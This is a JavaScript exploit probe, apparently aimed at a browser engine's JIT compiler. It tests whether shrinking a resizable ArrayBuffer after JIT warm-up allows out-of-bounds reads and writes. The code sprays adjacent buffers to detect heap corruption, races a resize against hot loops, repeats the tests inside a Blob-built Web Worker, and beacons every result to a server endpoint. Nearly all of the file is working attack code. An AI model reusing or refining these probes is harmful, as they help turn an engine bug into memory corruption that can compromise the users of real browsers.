/* p102-oob — Resizable ArrayBuffer OOB via DFG length caching
 *
 * E6 showed: shrink RAB to 16 bytes, store at index 10 succeeds.
 * Question: did the write ACTUALLY land in memory, or was it a no-op?
 *
 * Detection strategies:
 * F1: Fixed-length typed array view created before shrink
 * F2: Grow back after OOB write, check if value persists
 * F3: Adjacent allocation corruption detection
 * F4: DataView bounds vs TypedArray bounds
 * F5: DFG-compiled read at OOB index after shrink
 * F6: Race between resize and DFG-compiled access
 *
 * Beacon prefix: V102F-
 */
(function(){
"use strict";
var RUN_ID = "v102f" + Math.random().toString(36).slice(2,12);
var PREFIX = "V102F-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press102-oob");

/* ====== F1: Fixed-length view as oracle ====== */
function test_F1() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, {maxByteLength: 1024});
    var autoView = new Int32Array(rab); // auto-length, tracks resize
    r.autoLen = autoView.length; // 64

    // Fill with known pattern
    for (var i = 0; i < autoView.length; i++) autoView[i] = 0xAA000000 + i;

    // Create fixed-length view BEFORE shrink
    var fixedView;
    try {
      fixedView = new Int32Array(rab, 0, 64); // fixed at 64 elements
      r.fixedLen = fixedView.length;
      r.FIXED_VIEW = true;
    } catch(e) {
      r.fixedViewErr = e.name + ':' + e.message.slice(0,40);
    }

    // DFG warmup on auto view
    function storeAuto(idx, val) {
      autoView[idx] = val;
    }
    for (var i = 0; i < 100000; i++) {
      storeAuto(i & 63, i + 0.5);
    }
    r.warmupDone = true;

    // Shrink
    rab.resize(16); // 4 int32 elements
    r.autoLenAfterShrink = autoView.length;

    // Check if fixed view is still accessible
    if (fixedView) {
      try {
        r.fixedLenAfterShrink = fixedView.length;
        var fv10 = fixedView[10];
        r.fixedView10 = fv10;
        r.FIXED_READABLE = true;
      } catch(e) {
        r.fixedReadErr = e.name + ':' + e.message.slice(0,40);
      }
    }

    // DFG-compiled store at OOB index
    storeAuto(10, 0x42424242);
    r.storeAttempted = true;

    // Check through fixed view
    if (fixedView) {
      try {
        var after = fixedView[10];
        r.fixedView10After = after;
        r.OOB_WRITE_DETECTED = (after === 0x42424242);
      } catch(e) {
        r.fixedReadAfterErr = e.name;
      }
    }

    // Also grow back and check
    rab.resize(256);
    r.grewBack = rab.byteLength;
    r.autoView10After = autoView[10];
    r.OOB_PERSISTED = (autoView[10] === 0x42424242);

    r.SURVIVED = true;
    B("F1-FIXED-VIEW", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("F1-ERR", r); }
}

/* ====== F2: DFG-compiled READ at OOB index after shrink ====== */
function test_F2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, {maxByteLength: 1024});
    var arr = new Int32Array(rab);

    // Fill with sentinel pattern
    for (var i = 0; i < 64; i++) arr[i] = 0xDEAD0000 + i;

    // DFG warmup read function
    function readAt(idx) {
      return arr[idx];
    }
    for (var i = 0; i < 100000; i++) {
      readAt(i & 63);
    }
    r.warmupDone = true;

    // Shrink
    rab.resize(16);
    r.lenAfterShrink = arr.length;

    // DFG-compiled read at OOB index — should return undefined per spec
    // But if DFG cached length=64, it might read actual memory
    var oobVal = readAt(10);
    r.oobRead = oobVal;
    r.oobReadType = typeof oobVal;
    r.OOB_READ = (oobVal !== undefined);

    if (typeof oobVal === 'number') {
      r.oobReadHex = '0x' + (oobVal >>> 0).toString(16);
      // Check if it's our sentinel
      r.IS_SENTINEL = ((oobVal & 0xFFFF0000) === 0xDEAD0000);
    }

    // Try multiple OOB indices
    var reads = [];
    for (var j = 4; j < 20; j++) {
      var v = readAt(j);
      reads.push(j + ':' + (v === undefined ? 'undef' : '0x' + (v >>> 0).toString(16)));
    }
    r.oobReads = reads.join('|');

    r.SURVIVED = true;
    B("F2-OOB-READ", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("F2-ERR", r); }
}

/* ====== F3: Adjacent buffer corruption ====== */
function test_F3() {
  var r = {};
  try {
    // Allocate many adjacent buffers, then OOB write from one to detect in another
    var SPRAY = 100;
    var buffers = [];
    var views = [];
    for (var i = 0; i < SPRAY; i++) {
      var b = new ArrayBuffer(64, {maxByteLength: 256});
      var v = new Int32Array(b);
      for (var j = 0; j < 16; j++) v[j] = 0xCC000000 + (i * 16) + j;
      buffers.push(b);
      views.push(v);
    }

    // Pick one in the middle as attacker
    var attackIdx = 50;
    var attackBuf = buffers[attackIdx];
    var attackView = views[attackIdx];

    // DFG warmup
    function storeAttack(idx, val) {
      attackView[idx] = val;
    }
    for (var i = 0; i < 100000; i++) {
      storeAttack(i & 15, i + 0.5);
    }

    // Shrink attacker buffer
    attackBuf.resize(16); // 4 elements
    r.attackLen = attackView.length;

    // OOB write — should land in adjacent allocation if DFG uses cached length
    storeAttack(14, 0x41414141);
    storeAttack(15, 0x42424242);

    // Check adjacent buffers for corruption
    var corrupted = [];
    for (var i = 0; i < SPRAY; i++) {
      if (i === attackIdx) continue;
      var v = views[i];
      for (var j = 0; j < v.length; j++) {
        var expected = 0xCC000000 + (i * 16) + j;
        if (v[j] === 0x41414141 || v[j] === 0x42424242) {
          corrupted.push(i + '[' + j + ']=0x' + (v[j] >>> 0).toString(16));
        }
      }
    }
    r.corrupted = corrupted.length > 0 ? corrupted.join('|') : 'none';
    r.CORRUPTION_DETECTED = corrupted.length > 0;

    r.SURVIVED = true;
    B("F3-ADJACENT", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("F3-ERR", r); }
}

/* ====== F4: DataView on shrunk RAB ====== */
function test_F4() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, {maxByteLength: 1024});
    var arr = new Int32Array(rab);
    for (var i = 0; i < 64; i++) arr[i] = 0xBEEF0000 + i;

    // Create DataView
    var dv;
    try {
      dv = new DataView(rab);
      r.dvLen = dv.byteLength;
      r.DV_EXISTS = true;
    } catch(e) {
      r.dvErr = e.name + ':' + e.message.slice(0,40);
    }

    // Shrink
    rab.resize(16);
    r.arrLenAfter = arr.length;

    if (dv) {
      r.dvLenAfter = dv.byteLength;

      // Try DataView read at OOB offset
      try {
        var dvVal = dv.getInt32(40, true); // byte offset 40 = index 10
        r.dvOobRead = '0x' + (dvVal >>> 0).toString(16);
        r.DV_OOB_READ = true;
      } catch(e) {
        r.dvOobErr = e.name; // Should throw RangeError if bounds-checked
      }

      // Try DataView write at OOB offset
      try {
        dv.setInt32(40, 0x43434343, true);
        r.DV_OOB_WRITE = true;
      } catch(e) {
        r.dvWriteErr = e.name;
      }
    }

    r.SURVIVED = true;
    B("F4-DATAVIEW", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("F4-ERR", r); }
}

/* ====== F5: Tight race — resize in setTimeout(0) while DFG loop runs ====== */
function test_F5() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, {maxByteLength: 1024});
    var arr = new Uint32Array(rab);
    for (var i = 0; i < 64; i++) arr[i] = 0;

    function writeLoop(a, start, count) {
      for (var i = start; i < start + count; i++) {
        a[i & 63] = 0xDEADC0DE;
      }
    }

    // Warmup
    for (var i = 0; i < 10; i++) writeLoop(arr, 0, 100000);
    r.warmupDone = true;

    // Schedule resize to happen "during" the next hot loop
    var resized = false;
    setTimeout(function() {
      rab.resize(16);
      resized = true;
    }, 0);

    // Run hot loop — JS is single-threaded so resize fires between
    // event loop tasks, but DFG-compiled code runs atomically
    // However, if the JIT code checks length from memory (not cached),
    // the resize takes effect immediately for the next iteration
    writeLoop(arr, 0, 1000000);

    setTimeout(function() {
      r.resized = resized;
      r.rabSize = rab.byteLength;
      r.arrLen = arr.length;

      // Grow back and check what was written where
      rab.resize(256);
      var written = [];
      for (var j = 0; j < 64; j++) {
        if (arr[j] === 0xDEADC0DE) written.push(j);
      }
      r.writtenIndices = written.length;
      r.maxWritten = written.length > 0 ? Math.max.apply(null, written) : -1;
      r.SURVIVED = true;
      B("F5-RACE", r);
    }, 100);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("F5-ERR", r); }
}

/* ====== F6: Web Worker resize race ====== */
function test_F6() {
  var r = {};
  try {
    // With SharedArrayBuffer unavailable (confirmed), we can't share
    // memory between worker and main thread for a true race.
    // But we can test if the Worker has different behavior.

    var workerCode = '(' + function() {
      var rab = new ArrayBuffer(256, {maxByteLength: 1024});
      var arr = new Int32Array(rab);
      for (var i = 0; i < 64; i++) arr[i] = 0xBB000000 + i;

      function readIdx(a, idx) { return a[idx]; }
      for (var i = 0; i < 100000; i++) readIdx(arr, i & 63);

      rab.resize(16);

      // DFG-compiled OOB read
      var oob10 = readIdx(arr, 10);
      var oob20 = readIdx(arr, 20);
      var oob63 = readIdx(arr, 63);

      // DFG-compiled OOB write
      function writeIdx(a, idx, val) { a[idx] = val; }
      for (var i = 0; i < 100000; i++) writeIdx(arr, i & 63, i);
      rab.resize(16);
      writeIdx(arr, 10, 0x44444444);

      // Grow back
      rab.resize(256);
      var val10 = arr[10];

      postMessage({
        oob10: oob10 === undefined ? 'undef' : '0x' + (oob10>>>0).toString(16),
        oob20: oob20 === undefined ? 'undef' : '0x' + (oob20>>>0).toString(16),
        oob63: oob63 === undefined ? 'undef' : '0x' + (oob63>>>0).toString(16),
        val10After: val10 === undefined ? 'undef' : '0x' + (val10>>>0).toString(16),
        oobReadWorked: oob10 !== undefined,
        oobWriteWorked: val10 === 0x44444444,
        survived: true
      });
    }.toString() + ')()';

    var blob = new Blob([workerCode], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    var w = new Worker(url);

    w.onmessage = function(e) {
      r = e.data;
      w.terminate();
      URL.revokeObjectURL(url);
      B("F6-WORKER-OOB", r);
    };
    w.onerror = function(e) {
      r.workerErr = e.message ? e.message.slice(0,60) : 'error';
      B("F6-WORKER-OOB", r);
    };
    setTimeout(function() {
      if (!r.survived) { r.timeout = true; B("F6-WORKER-OOB", r); }
    }, 10000);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("F6-ERR", r); }
}

/* ====== Run ====== */
try {
  test_F1();                    // Fixed-length view oracle (0ms)
  setTimeout(test_F2, 4000);    // DFG OOB read after shrink (4s)
  setTimeout(test_F3, 10000);   // Adjacent buffer corruption (10s)
  setTimeout(test_F4, 17000);   // DataView on shrunk RAB (17s)
  setTimeout(test_F5, 22000);   // Tight resize race (22s)
  setTimeout(test_F6, 28000);   // Worker OOB test (28s)
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 4000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe102-done"); }, 50000);
})();
